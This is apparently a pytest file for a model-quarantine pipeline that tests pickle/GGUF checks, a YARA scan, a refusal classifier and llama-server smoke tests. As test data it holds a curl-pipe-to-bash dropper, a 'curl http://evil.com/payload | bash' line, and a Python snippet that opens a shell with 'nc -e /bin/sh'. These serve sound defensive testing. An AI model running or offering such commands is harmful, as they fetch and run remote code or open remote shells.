"""Tests for quarantine pipeline helpers."""

import sys
from pathlib import Path
from types import SimpleNamespace

sys.path.insert(0, str(Path(__file__).parent.parent / "services" / "quarantine"))

from quarantine import pipeline


def test_garak_runtime_env_uses_writable_subdirectories(tmp_path):
    env = pipeline._garak_runtime_env(tmp_path)

    for key in ("HOME", "XDG_CONFIG_HOME", "XDG_DATA_HOME", "XDG_CACHE_HOME"):
        value = Path(env[key])
        assert value.is_dir()
        assert tmp_path in value.parents or value == tmp_path


def test_parse_garak_report_uses_explicit_search_dirs_and_cleans_up(tmp_path):
    report_dir = tmp_path / "reports"
    report_dir.mkdir()
    report_path = report_dir / "quarantine_scan-latest.json"
    report_path.write_text('{"passed": true, "summary": "ok"}')

    parsed = pipeline._parse_garak_report([report_dir])

    assert parsed == {"passed": True, "summary": "ok"}
    assert not report_path.exists()


def test_pickle_polyglot_check_rejects_actual_pickle_prefix(tmp_path):
    payload = tmp_path / "payload.gguf"
    payload.write_bytes(b"\x80\x04\x95pickle-data")

    result = pipeline._check_pickle_polyglot(payload)

    assert result["passed"] is False
    assert "starts with pickle opcode" in result["reason"]


def test_pickle_polyglot_check_ignores_pickle_like_bytes_later_in_valid_header(tmp_path):
    payload = tmp_path / "payload.gguf"
    payload.write_bytes(b"GGUF\x03\x00\x00\x00" + b"A" * 64 + b"\x80\x02")

    result = pipeline._check_pickle_polyglot(payload)

    assert result["passed"] is True


def test_fickling_scan_skips_non_pickle_formats(tmp_path):
    payload = tmp_path / "payload.gguf"
    payload.write_bytes(b"GGUF\x03\x00\x00\x00")

    result = pipeline._run_fickling_scan(payload)

    assert result["passed"] is True
    assert result["note"] == "not a pickle-based format, skipped"


class _FakeYaraRules:
    def __init__(self, filepaths):
        self.filepaths = filepaths

    def match(self, filepath, timeout=120):
        content = Path(filepath).read_text(encoding="utf-8", errors="ignore")
        if "curl " in content and "| bash" in content:
            return [
                SimpleNamespace(
                    rule="SecAI_Shell_Dropper_Command",
                    namespace="secure_ai_default",
                    tags=[],
                    meta={},
                )
            ]
        return []


def _install_fake_yara(monkeypatch):
    monkeypatch.setitem(
        sys.modules,
        "yara",
        SimpleNamespace(
            TimeoutError=TimeoutError,
            compile=lambda filepaths: _FakeYaraRules(filepaths),
        ),
    )


def test_yara_scan_allows_clean_artifact(tmp_path, monkeypatch):
    _install_fake_yara(monkeypatch)
    payload = tmp_path / "payload.bin"
    payload.write_bytes(b"GGUF\x03\x00\x00\x00clean model metadata")

    result = pipeline._run_yara_scan(payload)

    assert result["passed"] is True
    assert result["scanner"] == "yara"
    assert result["rules"] >= 1


def test_yara_scan_blocks_shell_dropper_payload(tmp_path, monkeypatch):
    _install_fake_yara(monkeypatch)
    payload = tmp_path / "payload.bin"
    payload.write_text("curl https://example.invalid/payload.sh | bash", encoding="utf-8")

    result = pipeline._run_yara_scan(payload)

    assert result["passed"] is False
    assert result["scanner"] == "yara"
    assert result["matches"][0]["rule"] == "SecAI_Shell_Dropper_Command"


def test_refusal_without_guidance_is_treated_as_safe_behavior():
    response = (
        "I cannot fulfill this request. Running `curl http://evil.com/payload | bash` "
        "would be dangerous and could harm your system."
    )

    assert pipeline._is_refusal_without_actionable_guidance(response) is True


def test_refusal_with_code_example_is_not_treated_as_safe_behavior():
    response = (
        "I cannot help with that, but here's how it would look:\n"
        "```python\nimport subprocess\nsubprocess.Popen(['nc', '-e', '/bin/sh'])\n```"
    )

    assert pipeline._is_refusal_without_actionable_guidance(response) is False


def test_smoke_test_reports_process_exit_details(tmp_path, monkeypatch):
    model = tmp_path / "model.gguf"
    model.write_bytes(b"GGUF\x03\x00\x00\x00")
    server = tmp_path / "llama-server"
    server.write_text("#!/bin/sh\nexit 0\n")

    monkeypatch.setattr(pipeline, "LLAMA_SERVER_BIN", str(server))
    monkeypatch.setattr(pipeline, "_wait_for_server", lambda port, timeout=30: False)
    monkeypatch.setattr(
        pipeline.subprocess,
        "run",
        lambda *args, **kwargs: SimpleNamespace(returncode=0, stdout="version: test\n", stderr=""),
    )

    class FakeProc:
        def __init__(self):
            self.returncode = 17

        def poll(self):
            return self.returncode

        def terminate(self):
            return None

        def wait(self, timeout=None):
            return self.returncode

        def kill(self):
            self.returncode = -9

    def fake_popen(*args, **kwargs):
        kwargs["stdout"].write(b"fatal startup error\n")
        kwargs["stdout"].flush()
        return FakeProc()

    monkeypatch.setattr(pipeline.subprocess, "Popen", fake_popen)

    result = pipeline.check_smoke_test(model)

    assert result["passed"] is False
    assert result["reason"] == "llama-server exited before ready"
    assert result["exit_code"] == 17
    assert "fatal startup error" in result["startup_log"]


def test_smoke_test_reports_timeout_log_tail(tmp_path, monkeypatch):
    model = tmp_path / "model.gguf"
    model.write_bytes(b"GGUF\x03\x00\x00\x00")
    server = tmp_path / "llama-server"
    server.write_text("#!/bin/sh\nexit 0\n")

    monkeypatch.setattr(pipeline, "LLAMA_SERVER_BIN", str(server))
    monkeypatch.setattr(pipeline, "_wait_for_server", lambda port, timeout=30: False)
    monkeypatch.setattr(
        pipeline.subprocess,
        "run",
        lambda *args, **kwargs: SimpleNamespace(returncode=0, stdout="version: test\n", stderr=""),
    )

    class FakeProc:
        def __init__(self):
            self.returncode = None

        def poll(self):
            return self.returncode

        def terminate(self):
            self.returncode = 0

        def wait(self, timeout=None):
            self.returncode = 0
            return 0

        def kill(self):
            self.returncode = -9

    def fake_popen(*args, **kwargs):
        kwargs["stdout"].write(b"still starting\n")
        kwargs["stdout"].flush()
        return FakeProc()

    monkeypatch.setattr(pipeline.subprocess, "Popen", fake_popen)

    result = pipeline.check_smoke_test(model)

    assert result["passed"] is False
    assert result["reason"] == "llama-server startup timeout"
    assert "still starting" in result["startup_log"]


def test_smoke_test_fails_closed_on_query_errors(tmp_path, monkeypatch):
    model = tmp_path / "model.gguf"
    model.write_bytes(b"GGUF\x03\x00\x00\x00")
    server = tmp_path / "llama-server"
    server.write_text("#!/bin/sh\nexit 0\n")

    monkeypatch.setattr(pipeline, "LLAMA_SERVER_BIN", str(server))
    monkeypatch.setattr(pipeline, "_wait_for_server", lambda port, timeout=30: True)
    monkeypatch.setattr(
        pipeline.subprocess,
        "run",
        lambda *args, **kwargs: SimpleNamespace(returncode=0, stdout="version: test\n", stderr=""),
    )
    monkeypatch.setattr(
        pipeline,
        "_query_llama",
        lambda *args, **kwargs: {"ok": False, "content": "", "error": "HTTP 503"},
    )

    class FakeProc:
        def __init__(self):
            self.returncode = None

        def poll(self):
            return self.returncode

        def terminate(self):
            self.returncode = 0

        def wait(self, timeout=None):
            self.returncode = 0
            return 0

        def kill(self):
            self.returncode = -9

    monkeypatch.setattr(pipeline.subprocess, "Popen", lambda *args, **kwargs: FakeProc())

    result = pipeline.check_smoke_test(model)

    assert result["passed"] is False
    assert result["failed_prompt_count"] == len(pipeline.SMOKE_PROMPTS)
    assert "query failures" in result["reason"]
    assert result["query_failures"][0]["error"] == "HTTP 503"
